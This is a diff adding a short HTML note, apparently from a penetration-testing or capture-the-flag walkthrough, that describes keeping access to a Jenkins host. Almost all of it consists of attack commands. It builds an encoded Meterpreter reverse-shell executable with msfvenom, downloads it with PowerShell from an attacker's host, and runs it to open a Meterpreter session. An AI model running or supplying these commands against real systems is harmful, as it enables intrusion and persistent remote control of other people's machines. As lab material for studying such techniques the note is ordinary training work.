@@ -1,0 +1,29 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>3 Persistence</title>
+</head><body>To get persistence we can use metasploit<br/>
+<br/>
+Generate payload and setup HTTP server:<br/>
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe<br/>
+<br/>
+<img src="image.png" width="900" height="225" /><br/>
+<br/>
+Setup metasploit handler<br/>
+<img src="image_2.png" width="600" height="219" /><br/>
+<br/>
+Run on jenkins reverse shell<br/>
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-ip/shell-name.exe','shell-name.exe')"<br/>
+<img src="image_3.png" width="900" height="220" /><br/>
+<br/>
+Run the payload:<br/>
+Start-Process "shell-name.exe"<br/>
+<img src="image_4.png" /><br/>
+<br/>
+We got meterpreter<br/>
+<img src="image_5.png" width="700" height="167" /><br/>
+<br/>
+<br/>
+<br/>
+</body></html>
